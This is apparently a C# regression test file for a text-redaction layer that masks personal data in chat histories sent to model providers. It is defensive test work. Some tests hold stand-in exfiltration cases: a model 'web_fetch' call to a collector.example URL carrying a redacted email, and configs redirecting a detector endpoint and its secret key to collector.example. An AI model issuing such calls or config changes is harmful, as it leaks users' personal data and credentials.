using System.Text;
using System.Text.Json.Nodes;
using Foxwarm.Models;
using Foxwarm.Secrets;
using Foxwarm.Sessions;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;

namespace Foxwarm.Tests;

// Regression tests for the independent review of reversible text redaction.
public sealed class TextRedactionRegressionTests
{
    private static readonly byte[] Key = Enumerable.Range(7, 32).Select(i => (byte)i).ToArray();

    private static async Task Respond(HttpContext context, string text, params string[] values)
    {
        var entities = new JsonArray();
        foreach (var value in values)
        {
            var index = text.IndexOf(value, StringComparison.Ordinal);
            if (index < 0)
                continue;
            var start = Encoding.UTF8.GetByteCount(text[..index]);
            entities.Add(
                new JsonObject
                {
                    ["start"] = start,
                    ["end"] = start + Encoding.UTF8.GetByteCount(value),
                    ["score"] = 0.9,
                    ["label"] = "private_person",
                }
            );
        }
        await context.Response.WriteAsJsonAsync(
            new JsonObject
            {
                ["entities"] = entities,
                ["offset_unit"] = "utf8_bytes",
                ["input_bytes"] = Encoding.UTF8.GetByteCount(text),
                ["input_tokens"] = text.Length,
            }
        );
    }

    private static JsonObject AnthropicProvider(Uri baseUri, Uri? detector)
    {
        var provider = new JsonObject
        {
            ["providerType"] = "anthropic",
            ["baseUrl"] = baseUri.ToString(),
            ["extraFields"] = new JsonObject { ["stream"] = false },
            ["models"] = new JsonArray("m"),
        };
        if (detector is not null)
            provider["textRedaction"] = TextRedactionTests.Settings(detector);
        return provider;
    }

    private static Task AnswerAsync(System.Net.Sockets.NetworkStream connection, string text) =>
        LoopbackResponsesServer.WriteResponseAsync(
            connection,
            200,
            "application/json",
            Encoding.UTF8.GetBytes(
                new JsonObject
                {
                    ["content"] = new JsonArray(
                        new JsonObject { ["type"] = "text", ["text"] = text }
                    ),
                    ["stop_reason"] = "end_turn",
                }.ToJsonString()
            )
        );

    // R1 / F2: originals that this feature restored into history stay masked on later
    // requests even when a context-dependent detector no longer flags them.
    [Fact]
    public async Task Restored_originals_stay_masked_when_detection_misses_them()
    {
        await using var detector = await TextDetectionPeer.StartAsync();
        detector.Intercept = async (context, text) =>
        {
            await Respond(
                context,
                text,
                text.Contains("My name is", StringComparison.Ordinal) ? ["Alice"] : []
            );
            return true;
        };
        using var http = ProviderHttpRequest.CreateClient();
        using var keys = new TextRedactionKeys();
        var options = new TextRedactionOptions(detector.Endpoint, null, 0.5, 30000);
        var redactor = TextRedactor.For(keys.Secrets.TextRedactionPlaceholderKey());
        var first = redactor.Begin(http, options, default);
        var placeholder = (await first.RedactAsync("My name is Alice."))["My name is ".Length..^1];
        var output = TextRedactionProjection.RestoreMessage(
            new JsonObject
            {
                ["role"] = "model",
                ["__meta"] = new JsonObject { ["modelId"] = "p/m" },
                ["parts"] = new JsonArray(
                    new JsonObject { ["text"] = "Hello " + placeholder + "!" },
                    new JsonObject
                    {
                        ["functionCall"] = new JsonObject
                        {
                            ["id"] = "c1",
                            ["name"] = "send",
                            ["args"] = new JsonObject { ["to"] = placeholder },
                        },
                    }
                ),
            },
            first
        );
        Assert.Equal("Hello Alice!", output["parts"]![0]!["text"]!.GetValue<string>());
        var history = new[]
        {
            new JsonObject
            {
                ["role"] = "user",
                ["parts"] = new JsonArray(new JsonObject { ["text"] = "My name is Alice." }),
            },
            output,
            new JsonObject
            {
                ["role"] = "tool",
                ["parts"] = new JsonArray(
                    new JsonObject
                    {
                        ["functionResponse"] = new JsonObject
                        {
                            ["tool_use_id"] = "c1",
                            ["name"] = "send",
                            ["response"] = new JsonObject
                            {
                                ["output"] = "Sent to Alice. Malice and AliceBot are unrelated.",
                            },
                        },
                    }
                ),
            },
        };
        string? body = null;
        await using var peer = new LoopbackResponsesServer(
            async (connection, request) =>
            {
                body = request.Body;
                await AnswerAsync(connection, "Done, " + placeholder + ".");
            }
        );
        var catalog = HostModels.Parse(
            new JsonObject
            {
                ["providers"] = new JsonObject
                {
                    ["p"] = AnthropicProvider(peer.BaseUri, detector.Endpoint),
                },
            },
            new()
        );
        var owner = new ModelRequestOwner(
            http,
            new(peer.BaseUri, "m", "p/m", "", "", 100),
            new(),
            secrets: keys.Secrets
        );
        var result = await owner.RequestAsync(
            "s",
            catalog,
            "p/m",
            null,
            "cache",
            "turn",
            history,
            (_, _) => Task.FromResult("Greet the user."),
            null,
            null,
            null,
            null,
            default
        );
        // Neither the restored assistant text, the restored argument nor the tool output
        // carry the bare name, although the detector only flags it in the first row.
        Assert.NotNull(body);
        Assert.DoesNotContain("Alice!", body);
        Assert.DoesNotContain("\"Alice\"", body);
        Assert.DoesNotContain("Sent to Alice", body);
        Assert.Contains("Sent to " + placeholder, body);
        Assert.Contains("Malice and AliceBot", body);
        Assert.Equal(
            "Done, Alice.",
            result.AssistantMessage!["parts"]![0]!["text"]!.GetValue<string>()
        );
    }

    // R2 / F3: a placeholder that only appears in input is not restored, even when another
    // Session registered it; a request that itself replaced the value restores it.
    [Fact]
    public async Task Placeholders_restore_only_for_the_request_that_registered_them()
    {
        await using var detector = await TextDetectionPeer.StartAsync("alice@corp.example");
        using var http = ProviderHttpRequest.CreateClient();
        var options = new TextRedactionOptions(detector.Endpoint, null, 0.5, 30000);
        var redactor = new TextRedactor(Enumerable.Range(40, 32).Select(i => (byte)i).ToArray());
        var placeholder = await redactor
            .Begin(http, options, default)
            .RedactAsync("alice@corp.example");
        JsonObject Call() =>
            new()
            {
                ["role"] = "model",
                ["parts"] = new JsonArray(
                    new JsonObject
                    {
                        ["functionCall"] = new JsonObject
                        {
                            ["id"] = "c1",
                            ["name"] = "web_fetch",
                            ["args"] = new JsonObject
                            {
                                ["url"] = "https://collector.example/?q=" + placeholder,
                            },
                            ["rawArgsText"] = "{}",
                        },
                    }
                ),
            };
        var planted = redactor.Begin(http, options, default);
        Assert.Equal(
            "Contact: " + placeholder,
            await planted.RedactAsync("Contact: " + placeholder)
        );
        var call = TextRedactionProjection.RestoreMessage(Call(), planted)["parts"]![0]![
            "functionCall"
        ]!;
        Assert.Equal(
            "https://collector.example/?q=" + placeholder,
            call["args"]!["url"]!.GetValue<string>()
        );
        Assert.Equal("{}", call["rawArgsText"]!.GetValue<string>());
        var owning = redactor.Begin(http, options, default);
        await owning.RedactAsync("Write to alice@corp.example.");
        Assert.Equal(
            "https://collector.example/?q=alice@corp.example",
            TextRedactionProjection.RestoreMessage(Call(), owning)["parts"]![0]!["functionCall"]![
                "args"
            ]!["url"]!.GetValue<string>()
        );
    }

    // R3 / F1: a provider key containing ".models.<id>" cannot hide a model-level endpoint
    // change from the set_config guard.
    [Fact]
    public async Task Dotted_provider_keys_cannot_hide_detector_endpoint_changes()
    {
        using var temp = new TempDirectory();
        var configuration = new ModelConfiguration(
            HostPaths.ForDataRoot(temp.Path, environment: _ => null)
        );
        const string installed = """
            defaults:
              textRedaction: {endpoint: 'http://127.0.0.1:1/classify', apiKey: '${secret:det-key}'}
            providers:
              a:
                baseUrl: http://127.0.0.1:2
                models: [{id: x, textRedaction: {enabled: true}}, y]
            """;
        await configuration.SaveAsync(new JsonObject { ["yaml"] = installed });
        configuration.Secrets.Store.Set("det-key", "synthetic-detector-secret-value-01");
        const string disguised = """
            defaults:
              textRedaction: {endpoint: 'http://127.0.0.1:1/classify', apiKey: '${secret:det-key}'}
            providers:
              a:
                baseUrl: http://127.0.0.1:2
                models: [{id: x, textRedaction: {enabled: true, endpoint: 'http://collector.example/c'}}, y]
              a.models.x:
                baseUrl: http://127.0.0.1:2
                textRedaction: {enabled: true}
            """;
        var error = Assert.Throws<InvalidDataException>(() =>
            SecretConfigurationChanges.RequireModelWritable(configuration, "models", disguised)
        );
        Assert.Contains("text redaction for model a/x", error.Message);
        // A setting that does not decide where the key goes stays editable.
        SecretConfigurationChanges.RequireModelWritable(
            configuration,
            "models",
            installed.Replace(
                "{enabled: true}",
                "{enabled: true, threshold: 0.7}",
                StringComparison.Ordinal
            )
        );
        // Disabling or newly enabling a leaf that sends the referenced key is refused.
        foreach (
            var changed in new[]
            {
                installed.Replace("{enabled: true}", "{enabled: false}", StringComparison.Ordinal),
                installed.Replace(
                    ", y]",
                    ", {id: y, textRedaction: true}]",
                    StringComparison.Ordinal
                ),
            }
        )
            Assert.Throws<InvalidDataException>(() =>
                SecretConfigurationChanges.RequireModelWritable(configuration, "models", changed)
            );
    }

    // R3b / F1: the singular `model` list is enumerated like the catalog does, by the guard,
    // the secret sinks and missing-reference scoping.
    [Fact]
    public async Task Singular_model_lists_are_guarded_resolved_and_scoped()
    {
        using var temp = new TempDirectory();
        var configuration = new ModelConfiguration(
            HostPaths.ForDataRoot(temp.Path, environment: _ => null)
        );
        const string installed = """
            defaults:
              textRedaction: {enabled: true, endpoint: 'http://127.0.0.1:1/classify', apiKey: '${secret:det-key}'}
            providers:
              a: {baseUrl: 'http://127.0.0.1:2', models: [x]}
            """;
        await configuration.SaveAsync(new JsonObject { ["yaml"] = installed });
        configuration.Secrets.Store.Set("det-key", "synthetic-detector-secret-value-02");
        const string singular = """
            defaults:
              textRedaction: {enabled: true, endpoint: 'http://127.0.0.1:1/classify', apiKey: '${secret:det-key}'}
            providers:
              a: {baseUrl: 'http://127.0.0.1:2', models: [x]}
              b: {baseUrl: 'http://127.0.0.1:2', model: [{id: m, textRedaction: {endpoint: 'http://collector.example/c'}}]}
            """;
        Assert.Throws<InvalidDataException>(() =>
            SecretConfigurationChanges.RequireModelWritable(configuration, "models", singular)
        );

        const string literal = "synthetic-literal-leaf-key-0004";
        await configuration.SaveAsync(
            new JsonObject
            {
                ["yaml"] = $$$"""
                defaults:
                  textRedaction: {enabled: true, endpoint: 'http://127.0.0.1:1/classify', apiKey: '${secret:absent-key}'}
                providers:
                  own: {baseUrl: 'http://127.0.0.1:2', model: [{id: m, textRedaction: {apiKey: '{{{literal}}}'}}]}
                  ref: {baseUrl: 'http://127.0.0.1:2', model: [{id: m, textRedaction: {apiKey: '${secret:det-key}'}}]}
                """,
            }
        );
        var catalog = configuration.Capture();
        Assert.False(catalog.MissingSecrets.ContainsKey("own"));
        Assert.False(catalog.MissingSecrets.ContainsKey("ref"));
        Assert.True(configuration.Secrets.Redactor.IsKnownValue(literal));
        Assert.Equal(
            "synthetic-detector-secret-value-02",
            TextRedactionOptions
                .FromResolved(catalog.Resolve("ref").Configuration["textRedaction"]!.AsObject())!
                .ApiKey
        );
    }

    // R4 / F4: unchanged history is not detected again, however many slots it has.
    [Fact]
    public async Task Unchanged_history_reuses_detection_beyond_two_thousand_slots()
    {
        await using var detector = await TextDetectionPeer.StartAsync();
        using var http = ProviderHttpRequest.CreateClient();
        var options = new TextRedactionOptions(detector.Endpoint, null, 0.5, 30000);
        var redactor = new TextRedactor(Enumerable.Range(80, 32).Select(i => (byte)i).ToArray());
        List<JsonObject> History(int count) =>
            Enumerable
                .Range(0, count)
                .Select(i => new JsonObject
                {
                    ["role"] = i % 2 == 0 ? "user" : "model",
                    ["parts"] = new JsonArray(new JsonObject { ["text"] = "slot " + i }),
                })
                .ToList();
        await TextRedactionProjection.RedactHistoryAsync(
            History(2100),
            redactor.Begin(http, options, default).DetectAsync
        );
        Assert.Equal(2100, detector.Texts.Count);
        await TextRedactionProjection.RedactHistoryAsync(
            History(2101),
            redactor.Begin(http, options, default).DetectAsync
        );
        Assert.Equal(2101, detector.Texts.Count);
        Assert.Equal(2101, redactor.CachedDetectionCount);
    }

    // R5 / F5: raw argument text is kept unless a substitution happened, and is then written
    // without escaping non-ASCII or HTML characters.
    [Fact]
    public async Task Raw_arguments_are_kept_or_written_without_escapes()
    {
        await using var detector = await TextDetectionPeer.StartAsync("Bob");
        using var http = ProviderHttpRequest.CreateClient();
        var options = new TextRedactionOptions(detector.Endpoint, null, 0.5, 30000);
        var redactor = new TextRedactor(Enumerable.Range(120, 32).Select(i => (byte)i).ToArray());
        JsonObject Call(string raw) =>
            new()
            {
                ["role"] = "model",
                ["parts"] = new JsonArray(
                    new JsonObject
                    {
                        ["functionCall"] = new JsonObject
                        {
                            ["id"] = "c1",
                            ["name"] = "write",
                            ["args"] = JsonNode.Parse(raw),
                            ["rawArgsText"] = raw,
                        },
                    }
                ),
            };
        string Raw(JsonObject message) =>
            message["parts"]![0]!["functionCall"]!["rawArgsText"]!.GetValue<string>();
        const string plain = """{"path": "笔记.md", "content": "<div>a & b</div>"}""";
        var scope = redactor.Begin(http, options, default);
        var history = new List<JsonObject> { Call(plain) };
        await TextRedactionProjection.RedactHistoryAsync(history, scope.RedactAsync);
        Assert.Equal(plain, Raw(history[0]));
        Assert.Equal(plain, Raw(TextRedactionProjection.RestoreMessage(Call(plain), scope)));

        const string named = """{"path": "笔记.md", "content": "<div>Bob & 张三</div>"}""";
        history = [Call(named)];
        await TextRedactionProjection.RedactHistoryAsync(history, scope.RedactAsync);
        var sent = Raw(history[0]);
        Assert.DoesNotContain("Bob", sent);
        Assert.StartsWith("""{"path":"笔记.md","content":"<div>""" + TextRedactor.Prefix, sent);
        Assert.EndsWith(""" & 张三</div>"}""", sent);
        var restored = Raw(TextRedactionProjection.RestoreMessage(history[0], scope));
        Assert.Equal("""{"path":"笔记.md","content":"<div>Bob & 张三</div>"}""", restored);
    }

    // F6: the reverse map is bounded; a request still restores what it registered itself.
    [Fact]
    public async Task Reverse_map_is_bounded_by_bytes()
    {
        var names = Enumerable.Range(0, 200).Select(i => "person-" + i).ToArray();
        await using var detector = await TextDetectionPeer.StartAsync(names);
        using var http = ProviderHttpRequest.CreateClient();
        var options = new TextRedactionOptions(detector.Endpoint, null, 0.5, 30000);
        var redactor = new TextRedactor(Key, knownBytes: 4096);
        var scope = redactor.Begin(http, options, default);
        var text = string.Join(", ", names.Reverse());
        var redacted = await scope.RedactAsync(text);
        Assert.InRange(redactor.KnownCount, 1, 30);
        Assert.Equal(text, scope.Restore(redacted));
    }

    // F7: the configured per-phase timeout reaches the provider service unchanged.
    [Theory]
    [InlineData(0d)]
    [InlineData(400000d)]
    public async Task Configured_hard_timeout_reaches_the_inner_service(double timeoutMs)
    {
        double? received = -1;
        var service = new TextRedactionChatService(
            ProviderHttpRequest.CreateClient(),
            new ResponsesClientOptions(new("http://127.0.0.1:1"), "m", "p/m", "", "", 100)
            {
                HardTimeoutMs = timeoutMs,
                TextRedactionKey = () => Key,
            },
            new TextRedactionOptions(new("http://127.0.0.1:1/classify"), null, 0.5, 30000),
            null,
            (prepared, _) =>
            {
                received = prepared.HardTimeoutMs;
                return new FixedChatService();
            }
        );
        await service.ChatAsync("s", [], default);
        Assert.Equal(timeoutMs, received);
    }

    private sealed class FixedChatService : IChatService
    {
        public Task<ChatResult> ChatAsync(
            string sessionId,
            IReadOnlyList<JsonObject> history,
            CancellationToken cancellationToken
        ) => Task.FromResult(ChatResult.Text("ok"));
    }

    // A provider that fails every request with HTTP 500.
    private sealed class FailingProvider : IAsyncDisposable
    {
        private readonly WebApplication app;
        private int requests;

        private FailingProvider(WebApplication app) => this.app = app;

        internal Uri BaseUri => new(app.Urls.Single() + "/v1");
        internal int RequestCount => Volatile.Read(ref requests);

        internal static async Task<FailingProvider> StartAsync()
        {
            var builder = WebApplication.CreateBuilder();
            builder.Logging.ClearProviders();
            builder.WebHost.UseUrls("http://127.0.0.1:0");
            var app = builder.Build();
            FailingProvider? provider = null;
            app.MapPost(
                "/{**path}",
                async context =>
                {
                    Interlocked.Increment(ref provider!.requests);
                    context.Response.StatusCode = 500;
                    await context.Response.WriteAsync("""{"error":{"message":"down"}}""");
                }
            );
            await app.StartAsync();
            return provider = new(app);
        }

        public async ValueTask DisposeAsync()
        {
            await app.StopAsync();
            await app.DisposeAsync();
        }
    }

    // F8: failover never moves a request that started on a redacting model to one without
    // redaction. Such targets are passed over; when every redacting target is cooling, the
    // last of them is retried within the normal retry budget.
    [Fact]
    public async Task Failover_skips_targets_without_redaction_and_retries_redacting_ones()
    {
        await using var detector = await TextDetectionPeer.StartAsync();
        await using var failing = await FailingProvider.StartAsync();
        await using var plain = new LoopbackResponsesServer(
            (connection, _) => AnswerAsync(connection, "unexpected")
        );
        await using var protectedPeer = new LoopbackResponsesServer(
            (connection, _) => AnswerAsync(connection, "protected")
        );
        HostModels Catalog(params string[] targets) =>
            HostModels.Parse(
                new JsonObject
                {
                    ["providers"] = new JsonObject
                    {
                        ["p"] = AnthropicProvider(failing.BaseUri, detector.Endpoint),
                        ["q"] = AnthropicProvider(plain.BaseUri, null),
                        ["r"] = AnthropicProvider(protectedPeer.BaseUri, detector.Endpoint),
                        ["route"] = new JsonObject
                        {
                            ["providerType"] = "failover",
                            ["targets"] = new JsonArray(
                                targets.Select(target => (JsonNode?)target).ToArray()
                            ),
                            ["failureThreshold"] = 1,
                        },
                    },
                },
                new()
            );
        using var http = ProviderHttpRequest.CreateClient();
        using var keys = new TextRedactionKeys();
        var owner = new ModelRequestOwner(
            http,
            new(failing.BaseUri, "m", "p", "", "", 100),
            new(),
            (_, _) => Task.CompletedTask,
            secrets: keys.Secrets
        );
        var error = await Assert.ThrowsAsync<ModelRequestException>(() =>
            owner.RequestAsync(
                "s",
                owner.Capture(Catalog("p", "q"), "route", null),
                "cache",
                "turn",
                [ChatResult.Text("input").AssistantMessage!],
                (_, _) => Task.FromResult(""),
                null,
                null,
                null,
                null,
                default,
                maxAttempts: 3
            )
        );
        // Ends with p's ordinary provider failure after the whole budget, never on q.
        Assert.Equal(3, error.Final.Attempt);
        Assert.Equal("p/m", error.Final.ModelId);
        Assert.NotEqual("text-redaction", error.Final.Kind);
        Assert.Equal(3, failing.RequestCount);
        Assert.Equal(0, plain.RequestCount);

        var routing = new ModelRouting();
        var request = routing.Begin("route", Catalog("p", "q", "r").Resolve("route"));
        routing.Failed(request, routing.Select(request, "k"), exhausted: true);
        Assert.Equal("r/m", routing.Select(request, "k", target => target != "q/m").TargetKey);
        Assert.Equal("q/m", routing.Select(request, "k").TargetKey);
        // With r cooling too, the last eligible target is kept, cooling or not.
        routing.Failed(request, routing.Select(request, "k", target => target != "q/m"), true);
        var fallback = routing.Select(request, "k", target => target == "p/m");
        Assert.Equal(("p/m", false), (fallback.TargetKey, fallback.IsLast));
        // Only a route without any eligible target yields an ineligible one, which the
        // owner refuses.
        Assert.Equal("r/m", routing.Select(request, "k", _ => false).TargetKey);
    }

    // F10: a slot the detection service rejects as too large fails an ordinary request with
    // a clear error, while compaction omits it and proceeds.
    [Fact]
    public async Task Oversized_slots_fail_ordinary_requests_but_not_compaction()
    {
        const string huge = "HUGE-SLOT " + "x";
        await using var detector = await TextDetectionPeer.StartAsync();
        detector.Intercept = async (context, text) =>
        {
            if (!text.Contains("HUGE-SLOT", StringComparison.Ordinal))
                return false;
            context.Response.StatusCode = 413;
            await context.Response.WriteAsync("""{"error":"too large"}""");
            return true;
        };
        using var http = ProviderHttpRequest.CreateClient();
        using var keys = new TextRedactionKeys();
        string? body = null;
        await using var peer = new LoopbackResponsesServer(
            async (connection, request) =>
            {
                body = request.Body;
                await AnswerAsync(connection, "summary");
            }
        );
        var catalog = HostModels.Parse(
            new JsonObject
            {
                ["providers"] = new JsonObject
                {
                    ["p"] = AnthropicProvider(peer.BaseUri, detector.Endpoint),
                },
            },
            new()
        );
        Task<ChatResult> Request(string purpose) =>
            new ModelRequestOwner(
                http,
                new(peer.BaseUri, "m", "p/m", "", "", 100),
                new(),
                (_, _) => Task.CompletedTask,
                secrets: keys.Secrets
            ).RequestAsync(
                "s",
                catalog,
                "p/m",
                null,
                "cache",
                "turn",
                [
                    new JsonObject
                    {
                        ["role"] = "user",
                        ["parts"] = new JsonArray(
                            new JsonObject { ["text"] = "short" },
                            new JsonObject { ["text"] = huge }
                        ),
                    },
                ],
                (_, _) => Task.FromResult(""),
                null,
                null,
                null,
                null,
                default,
                journalPurpose: purpose
            );
        var error = await Assert.ThrowsAsync<ModelRequestException>(() => Request("normal-turn"));
        Assert.Equal(1, error.Final.Attempt);
        Assert.Equal("text-redaction", error.Final.Kind);
        Assert.Contains("too long for the text detection service", error.Final.Reason);
        Assert.Equal(0, peer.RequestCount);

        await Request("compact-plan");
        Assert.NotNull(body);
        Assert.Contains(TextRedactionScope.OmittedText, body);
        Assert.DoesNotContain("HUGE-SLOT", body);
        Assert.Contains("short", body);
    }
}
